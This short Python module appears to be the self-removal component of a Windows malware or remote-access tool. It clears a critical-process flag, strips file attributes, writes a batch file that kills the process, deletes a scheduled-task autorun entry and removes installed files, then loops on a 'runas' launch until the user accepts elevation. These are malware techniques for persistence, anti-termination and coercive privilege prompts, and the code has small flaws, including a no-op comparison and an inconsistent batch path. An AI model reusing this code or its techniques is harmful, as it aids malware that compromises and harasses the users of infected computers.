import os
import ctypes
from ctypes import *


#Removes itself from the system

def Uninstall(AutorunName, InstallPath, ProcessName, CurrentName, CurrentPath, Temp, ProgramData):
 windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
 ctypes.windll.kernel32.SetFileAttributesW(CurrentPath, 0)
 ctypes.windll.kernel32.SetFileAttributesW(InstallPath+'\\'+ProcessName, 0)
 with open(os.path.join(Temp, 'Uninstaller.bat'), 'w') as OPATH:
   OPATH.writelines(['taskkill /f /im "'+CurrentName+'"\n', 
                     'schtasks /delete /f /tn "'+AutorunName+'"\n', 
                     'del /s /q "'+CurrentPath+'"\n',
                     'del /s /q "'+InstallPath+'\\'+ProcessName+'"\n',
                     'rmdir /s /q "'+ProgramData+'Files'+'"'])
 while True:
  try:
   os.startfile(Temp+'Uninstaller.bat', 'runas')
  except:
   pass
  else:
   break